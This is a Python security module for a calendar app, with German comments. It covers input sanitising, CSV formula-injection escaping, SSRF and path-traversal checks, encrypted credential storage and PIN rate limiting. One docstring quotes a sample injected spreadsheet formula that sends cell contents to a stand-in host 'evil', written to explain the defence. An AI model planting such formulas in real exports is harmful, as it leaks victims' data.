"""Sicherheitsfunktionen von PyCalendar.

Buendelt alle sicherheitsrelevanten Bausteine an einer Stelle, damit sie
einzeln testbar sind (siehe tests/test_security.py und tests/test_pentest.py):

* CredentialVault  - verschlüsselte Ablage von Sync-Passwoertern
* validate_sync_url - SSRF-Schutz für CalDAV-/ICS-Adressen
* sanitize_csv_cell / safe_csv_value - Schutz vor CSV-Formel-Injection
* sanitize_text / clamp - Längen- und Zeichenbegrenzung für Importdaten
* safe_output_path - Schutz vor Path-Traversal beim Export
* RateLimiter - Bremse gegen Brute-Force auf die App-PIN
* constant_time_compare - timing-sichere Vergleiche
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import ipaddress
import os
import re
import secrets
import socket
import time
import unicodedata
from pathlib import Path
from typing import Optional
from urllib.parse import urlparse

# --------------------------------------------------------------------------
# Konstanten / Grenzwerte (Defense in Depth gegen Resource Exhaustion)
# --------------------------------------------------------------------------
MAX_TITLE_LEN = 500
MAX_TEXT_LEN = 10_000
MAX_CSV_BYTES = 25 * 1024 * 1024        # 25 MB
MAX_CSV_ROWS = 50_000
MAX_ICS_BYTES = 25 * 1024 * 1024
MAX_HTTP_REDIRECTS = 3
HTTP_TIMEOUT = 20                        # Sekunden

_CONTROL_CHARS = re.compile(r"[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]")
# Vollständige ANSI-/VT100-Sequenzen (Terminal- und Log-Injection)
_ANSI_SEQ = re.compile(r"\x1b\[[0-9;?]*[ -/]*[@-~]|\x1b[@-Z\\-_]")
# Zeichen, mit denen Tabellenkalkulationen eine Formel beginnen lassen
_FORMULA_PREFIXES = ("=", "+", "-", "@", "\t", "\r", "\n")


class SecurityError(Exception):
    """Wird geworfen, wenn eine Eingabe eine Sicherheitsregel verletzt."""


# --------------------------------------------------------------------------
# 1. Textbereinigung
# --------------------------------------------------------------------------

def sanitize_text(value, max_len: int = MAX_TEXT_LEN) -> str:
    """Entfernt Steuerzeichen, normalisiert Unicode, begrenzt die Länge.

    Schuetzt gegen:
    * Terminal-/Log-Injection über ANSI-Escapes und \\r
    * Unicode-Homoglyph-/Bidi-Tricks (NFKC + Entfernen von Bidi-Steuerzeichen)
    * Speicherverbrauch durch extrem lange Felder
    """
    if value is None:
        return ""
    text = str(value)
    # SICHERHEITSFIX PT-A8: vollständige ANSI-/VT100-Sequenzen entfernen,
    # nicht nur das Escape-Zeichen selbst (Log-/Anzeige-Injection).
    text = _ANSI_SEQ.sub("", text)
    text = unicodedata.normalize("NFKC", text)
    # Bidi-Override / unsichtbare Formatierungszeichen ("Trojan Source")
    text = "".join(ch for ch in text if unicodedata.category(ch) != "Cf")
    text = _CONTROL_CHARS.sub("", text)
    text = text.replace("\r\n", "\n").replace("\r", "\n")
    if len(text) > max_len:
        text = text[:max_len]
    return text.strip()


def sanitize_title(value) -> str:
    return sanitize_text(value, MAX_TITLE_LEN).replace("\n", " ").strip()


def clamp(value: int, low: int, high: int) -> int:
    return max(low, min(high, int(value)))


# --------------------------------------------------------------------------
# 2. CSV-Formel-Injection (OWASP: CSV Injection / Formula Injection)
# --------------------------------------------------------------------------

def sanitize_csv_cell(value) -> str:
    """Neutralisiert Zellen, die Excel/LibreOffice als Formel auffassen würde.

    Beispiel-Angriff in einer importierten Datei:
        Titel,=HYPERLINK("http://evil/?x="&A1,"Klick mich")
    Beim späteren Export würde die Formel im Tabellenprogramm des Opfers
    ausgeführt. Wir stellen deshalb ein Apostroph voran.
    """
    text = sanitize_text(value)
    if text and text[0] in _FORMULA_PREFIXES:
        return "'" + text
    return text


# Rueckwaertskompatibler Alias
safe_csv_value = sanitize_csv_cell


# --------------------------------------------------------------------------
# 3. SSRF-Schutz für Sync-Adressen
# --------------------------------------------------------------------------

_ALLOWED_SCHEMES = {"https", "webcals"}
_DEV_SCHEMES = {"http", "webcal"}


def _is_forbidden_ip(ip: str) -> bool:
    try:
        addr = ipaddress.ip_address(ip)
    except ValueError:
        return True
    return (addr.is_private or addr.is_loopback or addr.is_link_local
            or addr.is_multicast or addr.is_reserved or addr.is_unspecified
            or (addr.version == 6 and addr.ipv4_mapped is not None
                and _is_forbidden_ip(str(addr.ipv4_mapped))))


def validate_sync_url(url: str, allow_insecure: bool = False,
                      resolve_dns: bool = True) -> str:
    """Prüft eine CalDAV-/ICS-URL, bevor die App sie abruft.

    Blockiert:
    * andere Schemata als https (file://, gopher://, ftp:// ...)
    * Klartext-http ausser wenn ausdruecklich erlaubt (Debug-Schalter)
    * Hostnamen, die auf private, Loopback- oder Link-Local-Adressen zeigen
      (169.254.169.254 = Cloud-Metadaten, 127.0.0.1, 10.0.0.0/8, ...)
    * eingebettete Zugangsdaten (https://user:pass@host) - landen sonst in Logs
    """
    if not url or not isinstance(url, str):
        raise SecurityError("Leere Sync-Adresse.")
    url = url.strip()
    if len(url) > 2048:
        raise SecurityError("Sync-Adresse ist zu lang.")
    if _CONTROL_CHARS.search(url) or "\n" in url or "\r" in url:
        raise SecurityError("Sync-Adresse enthält Steuerzeichen.")

    parsed = urlparse(url)
    scheme = parsed.scheme.lower()
    if scheme in _DEV_SCHEMES and not allow_insecure:
        raise SecurityError(
            f"Unverschluesselte Verbindung ({scheme}://) ist nicht erlaubt. "
            "Bitte https:// verwenden.")
    if scheme not in _ALLOWED_SCHEMES | (_DEV_SCHEMES if allow_insecure else set()):
        raise SecurityError(f"Nicht unterstütztes Protokoll: {scheme or '(keines)'}")
    if parsed.username or parsed.password:
        raise SecurityError(
            "Zugangsdaten gehören nicht in die URL - bitte in die Felder "
            "Benutzername/Passwort eintragen.")
    host = parsed.hostname
    if not host:
        raise SecurityError("Sync-Adresse ohne Hostnamen.")
    if host.lower() in {"localhost", "localhost.localdomain", "metadata.google.internal"}:
        if not allow_insecure:
            raise SecurityError("Lokale Adressen sind als Sync-Ziel gesperrt.")

    if resolve_dns:
        try:
            infos = socket.getaddrinfo(host, None)
        except socket.gaierror as exc:
            raise SecurityError(f"Host nicht auflösbar: {host}") from exc
        for info in infos:
            ip = info[4][0]
            if _is_forbidden_ip(ip) and not allow_insecure:
                raise SecurityError(
                    f"{host} zeigt auf eine interne Adresse ({ip}) und wird "
                    "aus Sicherheitsgründen nicht abgerufen.")
    return url


# --------------------------------------------------------------------------
# 4. Pfadsicherheit
# --------------------------------------------------------------------------

def safe_output_path(base_dir, filename: str) -> Path:
    """Erzwingt, dass eine Datei innerhalb von base_dir bleibt.

    Blockt ../../etc/passwd, absolute Pfade, NUL-Bytes und Symlink-Ausbrueche.
    """
    base = Path(base_dir).resolve()
    name = sanitize_text(filename, 255)
    if not name:
        raise SecurityError("Leerer Dateiname.")
    name = name.replace("\\", "/").split("/")[-1]
    if name in {"", ".", ".."} or name.startswith("~"):
        raise SecurityError(f"Unzulaessiger Dateiname: {filename!r}")
    name = re.sub(r"[^A-Za-z0-9._\- ]", "_", name)
    target = (base / name).resolve()
    if target != base and base not in target.parents:
        raise SecurityError("Pfad verlässt das erlaubte Verzeichnis.")
    return target


# --------------------------------------------------------------------------
# 5. Verschluesselte Ablage der Sync-Zugangsdaten
# --------------------------------------------------------------------------

# Zwei gleichwertige Krypto-Unterbauten: bevorzugt `cryptography`, ersatzweise
# `pycryptodome`. Beide liefern AES-256-GCM und scrypt. Der Ersatz existiert,
# weil sich `cryptography` für Android nur mit Rust-Toolchain übersetzen lässt -
# `pycryptodome` baut ohne. Es wird in keinem Fall eigene Kryptografie
# geschrieben, nur zwischen zwei etablierten Bibliotheken gewählt.
CRYPTO_BACKEND = "none"

try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM as _CgAESGCM
    from cryptography.hazmat.primitives.kdf.scrypt import Scrypt as _CgScrypt
    CRYPTO_BACKEND = "cryptography"
except Exception:       # pragma: no cover - nur wenn Paket fehlt
    _CgAESGCM = _CgScrypt = None

try:
    from Crypto.Cipher import AES as _PcAES
    from Crypto.Protocol.KDF import scrypt as _pc_scrypt
    if CRYPTO_BACKEND == "none":
        CRYPTO_BACKEND = "pycryptodome"
except Exception:       # pragma: no cover
    _PcAES = _pc_scrypt = None

_HAVE_CRYPTO = CRYPTO_BACKEND != "none"

# scrypt-Parameter (bewusst an einer Stelle, für beide Unterbauten gleich)
_SCRYPT_N, _SCRYPT_R, _SCRYPT_P, _KEY_LEN = 2 ** 14, 8, 1, 32


def _derive_key(master: bytes, salt: bytes, backend: str) -> bytes:
    if backend == "cryptography":
        return _CgScrypt(salt=salt, length=_KEY_LEN, n=_SCRYPT_N,
                         r=_SCRYPT_R, p=_SCRYPT_P).derive(master)
    key = _pc_scrypt(master, salt, _KEY_LEN, N=_SCRYPT_N, r=_SCRYPT_R,
                     p=_SCRYPT_P)
    return key if isinstance(key, bytes) else key[0]


def _aead_encrypt(key: bytes, nonce: bytes, data: bytes, aad: bytes,
                  backend: str) -> bytes:
    if backend == "cryptography":
        return _CgAESGCM(key).encrypt(nonce, data, aad)
    cipher = _PcAES.new(key, _PcAES.MODE_GCM, nonce=nonce)
    cipher.update(aad)
    ciphertext, tag = cipher.encrypt_and_digest(data)
    return ciphertext + tag          # gleiches Format wie cryptography


def _aead_decrypt(key: bytes, nonce: bytes, blob: bytes, aad: bytes,
                  backend: str) -> bytes:
    if backend == "cryptography":
        return _CgAESGCM(key).decrypt(nonce, blob, aad)
    if len(blob) < 16:
        raise SecurityError("Beschädigte Zugangsdaten.")
    ciphertext, tag = blob[:-16], blob[-16:]
    cipher = _PcAES.new(key, _PcAES.MODE_GCM, nonce=nonce)
    cipher.update(aad)
    return cipher.decrypt_and_verify(ciphertext, tag)


class CredentialVault:
    """Verschlüsselt Sync-Passwörter mit AES-256-GCM.

    Schlüsselableitung: scrypt(n=2**14, r=8, p=1) aus einem
    gerätespezifischen Master-Secret, das mit 0600-Rechten abgelegt wird.
    Auf Android liegt die Datei im privaten App-Verzeichnis, auf das andere
    Apps ohne Root nicht zugreifen können.

    Passwörter werden NIE im Klartext in der Datenbank gespeichert.
    Das Token-Format ist zwischen beiden Unterbauten identisch, ein mit
    `cryptography` erzeugtes Token lässt sich also mit `pycryptodome` lesen
    und umgekehrt.
    """

    MAGIC = b"PCV1"

    def __init__(self, key_file):
        self.key_file = Path(key_file)
        self._master = self._load_or_create_master()

    def _load_or_create_master(self) -> bytes:
        if self.key_file.exists():
            data = self.key_file.read_bytes()
            if len(data) >= 32:
                self._harden_permissions()
                return data[:32]
        self.key_file.parent.mkdir(parents=True, exist_ok=True)
        master = secrets.token_bytes(32)
        # atomar + restriktive Rechte, bevor Inhalt geschrieben wird
        fd = os.open(str(self.key_file), os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
        try:
            os.write(fd, master)
        finally:
            os.close(fd)
        self._harden_permissions()
        return master

    def _harden_permissions(self) -> None:
        try:
            os.chmod(self.key_file, 0o600)
        except OSError:      # z.B. FAT32-Speicherkarte
            pass

    def _derive(self, salt: bytes) -> bytes:
        if not _HAVE_CRYPTO:
            raise SecurityError(self._missing_backend_message())
        return _derive_key(self._master, salt, CRYPTO_BACKEND)

    @staticmethod
    def _missing_backend_message() -> str:
        return ("Zugangsdaten können nicht sicher gespeichert werden: weder "
                "'cryptography' noch 'pycryptodome' ist installiert.")

    def encrypt(self, plaintext: str) -> str:
        if plaintext is None:
            plaintext = ""
        if not _HAVE_CRYPTO:
            raise SecurityError(self._missing_backend_message())
        salt = secrets.token_bytes(16)
        nonce = secrets.token_bytes(12)
        key = self._derive(salt)
        ct = _aead_encrypt(key, nonce, plaintext.encode("utf-8"), self.MAGIC,
                           CRYPTO_BACKEND)
        return base64.b64encode(self.MAGIC + salt + nonce + ct).decode("ascii")

    def decrypt(self, token: str) -> str:
        if not token:
            return ""
        if not _HAVE_CRYPTO:
            raise SecurityError(self._missing_backend_message())
        raw = base64.b64decode(token.encode("ascii"))
        if not raw.startswith(self.MAGIC):
            raise SecurityError("Unbekanntes Format der Zugangsdaten.")
        salt, nonce, ct = raw[4:20], raw[20:32], raw[32:]
        key = self._derive(salt)
        return _aead_decrypt(key, nonce, ct, self.MAGIC,
                             CRYPTO_BACKEND).decode("utf-8")

    def wipe(self) -> None:
        """Loescht das Master-Secret - alle gespeicherten Passwörter werden
        damit unbrauchbar (Remote-Wipe / "Alle Konten entfernen")."""
        if self.key_file.exists():
            size = self.key_file.stat().st_size
            with open(self.key_file, "r+b") as fh:
                fh.write(secrets.token_bytes(size))
                fh.flush()
                os.fsync(fh.fileno())
            self.key_file.unlink()
        self._master = self._load_or_create_master()


# --------------------------------------------------------------------------
# 6. App-Sperre (PIN) - Hashing + Brute-Force-Bremse
# --------------------------------------------------------------------------

def hash_pin(pin: str, salt: Optional[bytes] = None) -> str:
    """PBKDF2-HMAC-SHA256 mit 310.000 Iterationen (OWASP-Empfehlung)."""
    salt = salt or secrets.token_bytes(16)
    dk = hashlib.pbkdf2_hmac("sha256", pin.encode("utf-8"), salt, 310_000)
    return f"pbkdf2_sha256$310000${base64.b64encode(salt).decode()}$" \
           f"{base64.b64encode(dk).decode()}"


def verify_pin(pin: str, stored: str) -> bool:
    try:
        algo, iters, salt_b64, hash_b64 = stored.split("$")
        if algo != "pbkdf2_sha256":
            return False
        dk = hashlib.pbkdf2_hmac("sha256", pin.encode("utf-8"),
                                 base64.b64decode(salt_b64), int(iters))
        return hmac.compare_digest(dk, base64.b64decode(hash_b64))
    except Exception:
        return False


def constant_time_compare(a: str, b: str) -> bool:
    return hmac.compare_digest(str(a).encode(), str(b).encode())


class RateLimiter:
    """Einfache Sperre nach zu vielen Fehlversuchen (exponentielles Backoff)."""

    def __init__(self, max_attempts: int = 5, base_lockout: int = 30):
        self.max_attempts = max_attempts
        self.base_lockout = base_lockout
        self.failures = 0
        self.locked_until = 0.0

    def check(self) -> None:
        now = time.time()
        if now < self.locked_until:
            raise SecurityError(
                f"Zu viele Fehlversuche. Bitte {int(self.locked_until - now)}s warten.")

    def record_failure(self) -> None:
        self.failures += 1
        if self.failures >= self.max_attempts:
            over = self.failures - self.max_attempts
            self.locked_until = time.time() + self.base_lockout * (2 ** min(over, 6))

    def record_success(self) -> None:
        self.failures = 0
        self.locked_until = 0.0


def redact(text: str) -> str:
    """Entfernt Zugangsdaten aus Texten, bevor sie geloggt werden."""
    if not text:
        return ""
    text = re.sub(r"(://[^/\s:@]+):[^/\s@]+@", r"\1:***@", str(text))
    text = re.sub(r"(?i)(password|passwort|token|authorization|secret)"
                  r"(\s*[:=]\s*)\S+", r"\1\2***", text)
    return text
